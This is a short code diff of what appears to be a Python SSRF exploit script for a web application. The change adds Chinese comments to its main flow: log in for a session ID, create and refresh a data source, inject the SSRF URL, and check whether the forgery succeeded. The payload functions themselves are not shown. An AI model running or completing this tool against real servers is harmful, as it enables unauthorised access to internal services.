@@ -133,11 +133,11 @@ def login(ghost,username,password):
 
 
 if username:
-	sessionid = login(ghost,username,password)
+	sessionid = login(ghost,username,password)  #登录，获取sessionid
 
 if ssrf_url:
-	i = create_source(sessionid,ssrf_url,ghost)
+	i = create_source(sessionid,ssrf_url,ghost) #创建数据源，并返回id
 	id = str(i)
-	refresh_source(ghost,sessionid,id)
-	create_ssrf(sessionid,ssrf_url,ghost,id)
-	check_ssrf(sessionid,id,ghost,ssrf_url)
+	refresh_source(ghost,sessionid,id) #刷新数据源
+	create_ssrf(sessionid,ssrf_url,ghost,id) #更新数据源，添加ssrf参数
+	check_ssrf(sessionid,id,ghost,ssrf_url) #检查ssrf是否成功
